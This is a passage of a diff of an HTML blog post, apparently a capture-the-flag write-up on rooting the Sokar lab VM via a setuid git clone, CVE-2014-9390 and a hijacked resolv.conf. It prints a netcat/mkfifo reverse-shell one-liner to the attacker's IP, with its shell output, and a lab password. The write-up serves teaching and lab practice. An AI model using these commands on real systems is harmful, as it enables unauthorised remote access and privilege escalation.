-R12: 0x7fffffffe7a0 (<span style="color:#87ceeb">&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style="color:#87ceeb">&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span>)
+R12: 0x7fffffffe7a0 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style=color:#e6db74>&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span><span style=color:#f92672>)</span>
 R13: 0x7fffffffe910 --&gt; 0x1
 R14: 0x0
 R15: 0x0
-EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
+EFLAGS: 0x202 <span style=color:#f92672>(</span>carry parity adjust zero sign trap INTERRUPT direction overflow<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>-------------------------------------code-------------------------------------<span style=color:#f92672>]</span>
    0x555555554a2b &lt;main+316&gt;:   mov    eax,0x0
    0x555555554a30 &lt;main+321&gt;:   call   0x5555555547a0 &lt;setreuid@plt&gt;
    0x555555554a35 &lt;main+326&gt;:   mov    rdi,rbx
-=&gt; 0x555555554a38 &lt;main+329&gt;:   mov    eax,0x0
+<span style=color:#f92672>=</span>&gt; 0x555555554a38 &lt;main+329&gt;:   mov    eax,0x0
    0x555555554a3d &lt;main+334&gt;:   call   0x555555554750 &lt;system@plt&gt;
    0x555555554a42 &lt;main+339&gt;:   mov    rsp,r12
    0x555555554a45 &lt;main+342&gt;:   jmp    0x555555554a5d &lt;main+366&gt;
-   0x555555554a47 &lt;main+344&gt;:   lea    rsi,[rip+0x12c]        <span style="color:#0f0"># 0x555555554b7a</span>
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffe740 (<span style="color:#87ceeb">&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-0008| 0x7fffffffe748 (<span style="color:#87ceeb">&#34;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-0016| 0x7fffffffe750 (<span style="color:#87ceeb">&#34;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-0024| 0x7fffffffe758 (<span style="color:#87ceeb">&#34;/root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-0032| 0x7fffffffe760 (<span style="color:#87ceeb">&#34;kar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-0040| 0x7fffffffe768 (<span style="color:#87ceeb">&#34;/root/secret-project /mnt/secret-project/&#34;</span>)
-0048| 0x7fffffffe770 (<span style="color:#87ceeb">&#34;cret-project /mnt/secret-project/&#34;</span>)
-0056| 0x7fffffffe778 (<span style="color:#87ceeb">&#34;ject /mnt/secret-project/&#34;</span>)
-[------------------------------------------------------------------------------]
+   0x555555554a47 &lt;main+344&gt;:   lea    rsi,<span style=color:#f92672>[</span>rip+0x12c<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x555555554b7a</span>
+<span style=color:#f92672>[</span>------------------------------------stack-------------------------------------<span style=color:#f92672>]</span>
+0000| 0x7fffffffe740 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0008| 0x7fffffffe748 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0016| 0x7fffffffe750 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0024| 0x7fffffffe758 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0032| 0x7fffffffe760 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;kar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0040| 0x7fffffffe768 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0048| 0x7fffffffe770 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;cret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+0056| 0x7fffffffe778 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ject /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>------------------------------------------------------------------------------<span style=color:#f92672>]</span>
 Legend: code, data, rodata, value
 
-Breakpoint 1, 0x0000555555554a38 in main ()
-gdb-peda$ x/x <span style="color:#eedd82">$rbx</span>
+Breakpoint 1, 0x0000555555554a38 in main <span style=color:#f92672>()</span>
+gdb-peda$ x/x $rbx
 0x7fffffffe740: 0x2f
-gdb-peda$ x/s <span style="color:#eedd82">$rbx</span>
-0x7fffffffe740:  <span style="color:#87ceeb">&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>
-gdb-peda$ x/s <span style="color:#eedd82">$rdx</span>
-0x7fffffffe7a0:  <span style="color:#87ceeb">&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style="color:#87ceeb">&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span>
+gdb-peda$ x/s $rbx
+0x7fffffffe740:  <span style=color:#e6db74>&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>
+gdb-peda$ x/s $rdx
+0x7fffffffe7a0:  <span style=color:#e6db74>&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style=color:#e6db74>&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span>
 gdb-peda$
-</code></pre></div><p>Right before this call though, there is a instruction to <code>call   0x5555555547a0 &lt;setreuid@plt&gt;</code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>
-<h3 id="inspecting-git">inspecting git</h3>
+</code></pre></div><p>Right before this call though, there is a instruction to <code>call 0x5555555547a0 &lt;setreuid@plt></code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>
+<h3 id=inspecting-git>inspecting git</h3>
 <p>I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a <code>git clone</code> as root? One of my first theories was that if I could get <code>sokar-dev</code> to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions <code>git</code> will honor really is the symlink and executable bits :(</p>
 <p>Further enumeration while I was thinking about the possibilities revealed that <code>/mnt/</code> was actually mounted with the <code>vfat</code> filesystem!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;mount; cat /etc/fstab&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;mount; cat /etc/fstab&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;mount; cat /etc/fstab&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;mount; cat /etc/fstab&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
-/dev/sda1 on / type ext4 (rw)
-proc on /proc type proc (rw)
-sysfs on /sys type sysfs (rw)
-devpts on /dev/pts type devpts (rw,gid=5,mode=620)
-tmpfs on /dev/shm type tmpfs (rw)
-/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
-none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)
+/dev/sda1 on / type ext4 <span style=color:#f92672>(</span>rw<span style=color:#f92672>)</span>
+proc on /proc type proc <span style=color:#f92672>(</span>rw<span style=color:#f92672>)</span>
+sysfs on /sys type sysfs <span style=color:#f92672>(</span>rw<span style=color:#f92672>)</span>
+devpts on /dev/pts type devpts <span style=color:#f92672>(</span>rw,gid<span style=color:#f92672>=</span>5,mode<span style=color:#f92672>=</span>620<span style=color:#f92672>)</span>
+tmpfs on /dev/shm type tmpfs <span style=color:#f92672>(</span>rw<span style=color:#f92672>)</span>
+/dev/sdb1 on /mnt type vfat <span style=color:#f92672>(</span>rw,uid<span style=color:#f92672>=</span>501,gid<span style=color:#f92672>=</span>502<span style=color:#f92672>)</span>
+none on /proc/sys/fs/binfmt_misc type binfmt_misc <span style=color:#f92672>(</span>rw<span style=color:#f92672>)</span>
 
-<span style="color:#0f0">#</span>
-<span style="color:#0f0"># /etc/fstab</span>
-<span style="color:#0f0"># Created by anaconda on Wed Nov 12 13:29:15 2014</span>
-<span style="color:#0f0">#</span>
-<span style="color:#0f0"># Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;</span>
-<span style="color:#0f0"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span>
-<span style="color:#0f0">#</span>
-<span style="color:#eedd82">UUID</span>=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        <span style="color:#f60">1</span> <span style="color:#f60">1</span>
-tmpfs                   /dev/shm                tmpfs   defaults        <span style="color:#f60">0</span> <span style="color:#f60">0</span>
-devpts                  /dev/pts                devpts  <span style="color:#eedd82">gid</span>=5,mode=<span style="color:#f60">620</span>  <span style="color:#f60">0</span> <span style="color:#f60">0</span>
-sysfs                   /sys                    sysfs   defaults        <span style="color:#f60">0</span> <span style="color:#f60">0</span>
-proc                    /proc                   proc    defaults        <span style="color:#f60">0</span> <span style="color:#f60">0</span>
-/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=<span style="color:#f60">502</span>    <span style="color:#f60">0</span> <span style="color:#f60">0</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># /etc/fstab</span>
+<span style=color:#75715e># Created by anaconda on Wed Nov 12 13:29:15 2014</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;</span>
+<span style=color:#75715e># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span>
+<span style=color:#75715e>#</span>
+UUID<span style=color:#f92672>=</span>cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1</span>
+tmpfs                   /dev/shm                tmpfs   defaults        <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
+devpts                  /dev/pts                devpts  gid<span style=color:#f92672>=</span>5,mode<span style=color:#f92672>=</span><span style=color:#ae81ff>620</span>  <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
+sysfs                   /sys                    sysfs   defaults        <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
+proc                    /proc                   proc    defaults        <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
+/dev/sdb1       /mnt            vfat    defaults,uid<span style=color:#f92672>=</span>501,gid<span style=color:#f92672>=</span><span style=color:#ae81ff>502</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
 </code></pre></div><p>As you can see, <code>/mnt</code> also specified the uid/gid for files on the mount, so even if I <em>were</em> able to get a suid shell onto the file system, root will not be the one owning it.</p>
-<p>However. <code>vfat</code>. Why <code>vfat</code>&hellip; Of course! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390">CVE-2014-9390</a>. The potential client side code execution bug in older <code>git</code> versions where a case insensitive filesystem may cause the <code>git</code> client to read hooks from <code>.Git/hooks</code> instead of <code>.git/hooks</code>. And, of course, <code>vfat</code> is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.</p>
+<p>However. <code>vfat</code>. Why <code>vfat</code>&mldr; Of course! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390">CVE-2014-9390</a>. The potential client side code execution bug in older <code>git</code> versions where a case insensitive filesystem may cause the <code>git</code> client to read hooks from <code>.Git/hooks</code> instead of <code>.git/hooks</code>. And, of course, <code>vfat</code> is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.</p>
 <p>I checked up on the installed version of <code>git</code> on Sokar, just to make sure that it is in fact vulnerable:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;git --version&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;git --version&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;git --version&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;git --version&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
 git version 2.2.0
 </code></pre></div><p>Great. <code>git</code> version 2.2.1 fixed this bug so we are in luck.</p>
-<h2 id="rooting-sokar">rooting sokar</h2>
+<h2 id=rooting-sokar>rooting sokar</h2>
 <p>All of this information was great to have, but it still had one major problem. How can I clone a repository <strong>I</strong> own? I made <em>countless</em> attempts to try fool the environment into resolving <code>sokar-dev</code> to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &lsquo;cleans up&rsquo; the environment, especially for reasons such as this one.</p>
 <p>I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
--rw-rw-rw- <span style="color:#f60">1</span> root root <span style="color:#f60">19</span> Jan  <span style="color:#f60">2</span> 20:12 /etc/resolv.conf
+-rw-rw-rw- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>19</span> Jan  <span style=color:#ae81ff>2</span> 20:12 /etc/resolv.conf
 </code></pre></div><p><code>/etc/resolv.conf</code> is <strong>world writable</strong>. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D</p>
-<h3 id="preparing-the-environment-and-exploit">preparing the environment and exploit</h3>
+<h3 id=preparing-the-environment-and-exploit>preparing the environment and exploit</h3>
 <p>I decided to use <code>dnsmasq</code> for a quick to setup DNS server. I added a line to <code>/etc/dnsmasq.hosts</code> to answer a query for <code>sokar-dev</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
 192.168.217.174 sokar-dev
-</code></pre></div><p>&hellip; and started the <code>dnsmasq</code> server:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts
+</code></pre></div><p>&mldr; and started the <code>dnsmasq</code> server:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts
 
-dnsmasq: started, version 2.62 cachesize <span style="color:#f60">150</span>
+dnsmasq: started, version 2.62 cachesize <span style=color:#ae81ff>150</span>
 dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
 dnsmasq: reading /etc/resolv.conf
 dnsmasq: using nameserver 192.168.252.2#53
-dnsmasq: read /etc/hosts - <span style="color:#f60">6</span> addresses
-dnsmasq: read /etc/dnsmasq.hosts - <span style="color:#f60">1</span> addresses
+dnsmasq: read /etc/hosts - <span style=color:#ae81ff>6</span> addresses
+dnsmasq: read /etc/dnsmasq.hosts - <span style=color:#ae81ff>1</span> addresses
 </code></pre></div><p>Testing my DNS server proved that it was working just fine:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ dig sokar-dev @127.0.0.1
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ dig sokar-dev @127.0.0.1
 
 ; &lt;&lt;&gt;&gt; DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;&gt;&gt; sokar-dev @127.0.0.1
 ;; global options: +cmd
 ;; Got answer:
-;; -&gt;&gt;HEADER<span style="color:#87ceeb">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#f60">48044</span>
-;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#f60">0</span>
+;; -&gt;&gt;HEADER<span style=color:#e6db74>&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style=color:#ae81ff>48044</span>
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style=color:#ae81ff>0</span>
 
 ;; QUESTION SECTION:
 ;sokar-dev.         IN  A
 
 ;; ANSWER SECTION:
-sokar-dev.      <span style="color:#f60">0</span>   IN  A   192.168.217.174
+sokar-dev.      <span style=color:#ae81ff>0</span>   IN  A   192.168.217.174
 
-;; Query time: <span style="color:#f60">13</span> msec
-;; SERVER: 127.0.0.1#53(127.0.0.1)
-;; WHEN: Tue Feb  <span style="color:#f60">3</span> 12:12:02 <span style="color:#f60">2015</span>
-;; MSG SIZE  rcvd: <span style="color:#f60">43</span>
-</code></pre></div><p>Awesome. The next step was to replace the contents of Sokar&rsquo;s <code>/etc/resolv.conf</code> so that the dns server to use is <em>192.168.217.174</em> with the command <code>python apophis.py &quot;echo \&quot;nameserver\ 192.168.217.174\&quot; &gt; /etc/resolv.conf&quot;</code> and confirm that it worked:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;cat /etc/resolv.conf&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;cat /etc/resolv.conf&#39;, &#39;apophis&#39;]);&#34;</span>
+;; Query time: <span style=color:#ae81ff>13</span> msec
+;; SERVER: 127.0.0.1#53<span style=color:#f92672>(</span>127.0.0.1<span style=color:#f92672>)</span>
+;; WHEN: Tue Feb  <span style=color:#ae81ff>3</span> 12:12:02 <span style=color:#ae81ff>2015</span>
+;; MSG SIZE  rcvd: <span style=color:#ae81ff>43</span>
+</code></pre></div><p>Awesome. The next step was to replace the contents of Sokar&rsquo;s <code>/etc/resolv.conf</code> so that the dns server to use is <em>192.168.217.174</em> with the command <code>python apophis.py "echo \"nameserver\ 192.168.217.174\" > /etc/resolv.conf"</code> and confirm that it worked:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;cat /etc/resolv.conf&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;cat /etc/resolv.conf&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
 nameserver 192.168.217.174
 </code></pre></div><p>Great. Testing time!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;echo Y | /home/apophis/build&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;echo Y | /home/apophis/build&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
-Cloning into <span style="color:#87ceeb">&#39;/mnt/secret-project&#39;</span>...
+Cloning into <span style=color:#e6db74>&#39;/mnt/secret-project&#39;</span>...
 Host key verification failed.
 fatal: Could not read from remote repository.
 
 Please make sure you have the correct access rights
 and the repository exists.
-Build? (Y/N)
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span>
 </code></pre></div><p>Yesssssss, and nooooooooo. From the <code>dnsmasq</code> console output I could see the request for <code>sokar-dev</code> coming in and a reply getting sent:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dnsmasq: query[A] sokar-dev from 192.168.217.163
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>dnsmasq: query<span style=color:#f92672>[</span>A<span style=color:#f92672>]</span> sokar-dev from 192.168.217.163
 dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
-</code></pre></div><p>However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &lsquo;yes&rsquo;. I can not use <code>ssh-keyscan &gt;&gt; ~/.ssh/known_hosts</code> as I can&rsquo;t write to <code>root</code>&rsquo;s <code>.ssh</code> directory, nor can I modify the command that is being passed onto <code>system()</code> in the binary to specify <code>-o StrictHostKeyChecking=no</code>.</p>
-<p>Unfortunately, due to these restrictions, I had to finally give in and go one step back to <code>bynarr.py</code> and use his allowed egress access on <code>tcp/51242</code> to build a interactive shell. On one session I started a netcat listener, and on another, I ran <code>python bynarr.py &quot;/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.217.174 51242 &gt;/tmp/f&quot;</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ nc -lvp <span style="color:#f60">51242</span>
-listening on [any] <span style="color:#f60">51242</span> ...
+</code></pre></div><p>However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &lsquo;yes&rsquo;. I can not use <code>ssh-keyscan >> ~/.ssh/known_hosts</code> as I can&rsquo;t write to <code>root</code>&rsquo;s <code>.ssh</code> directory, nor can I modify the command that is being passed onto <code>system()</code> in the binary to specify <code>-o StrictHostKeyChecking=no</code>.</p>
+<p>Unfortunately, due to these restrictions, I had to finally give in and go one step back to <code>bynarr.py</code> and use his allowed egress access on <code>tcp/51242</code> to build a interactive shell. On one session I started a netcat listener, and on another, I ran <code>python bynarr.py "/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.217.174 51242 >/tmp/f"</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ nc -lvp <span style=color:#ae81ff>51242</span>
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>51242</span> ...
 192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
-connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] <span style="color:#f60">40382</span>
+connect to <span style=color:#f92672>[</span>192.168.217.174<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.217.163<span style=color:#f92672>]</span> <span style=color:#ae81ff>40382</span>
 sh: no job control in this shell
-sh-4.1$ python -c <span style="color:#87ceeb">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-python -c <span style="color:#87ceeb">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-[bynarr@sokar cgi-bin]$ su - apophis
+sh-4.1$ python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<span style=color:#f92672>[</span>bynarr@sokar cgi-bin<span style=color:#f92672>]</span>$ su - apophis
 su - apophis
 Password: overdrive
 
-[apophis@sokar ~]$ id
+<span style=color:#f92672>[</span>apophis@sokar ~<span style=color:#f92672>]</span>$ id
 id
-<span style="color:#eedd82">uid</span>=501(apophis) <span style="color:#eedd82">gid</span>=502(apophis) <span style="color:#eedd82">groups</span>=502(apophis)
-[apophis@sokar ~]$
